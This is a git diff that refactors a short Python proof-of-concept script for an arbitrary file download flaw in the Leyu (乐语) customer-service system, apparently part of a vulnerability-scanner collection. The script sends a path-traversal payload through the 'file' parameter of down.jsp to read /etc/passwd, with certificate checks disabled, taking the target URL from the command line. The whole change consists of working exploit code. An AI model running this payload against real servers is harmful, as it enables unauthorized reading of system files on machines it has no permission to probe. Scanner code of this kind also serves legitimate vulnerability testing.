@@ -9,17 +9,10 @@ description: 乐语客服系统down.jsp文件file参数未过滤导致任意文�
 import sys
 import requests
 import warnings
-  
-  
-
-class down_filedownload:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['乐语客服系统任意文件下载漏洞','','']
         payload = "/live/down.jsp?file=../../../../../../../../../../../../../../../../etc/passwd"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, timeout=10, verify=False)
 
@@ -35,5 +28,4 @@ class down_filedownload:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = down_filedownload(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
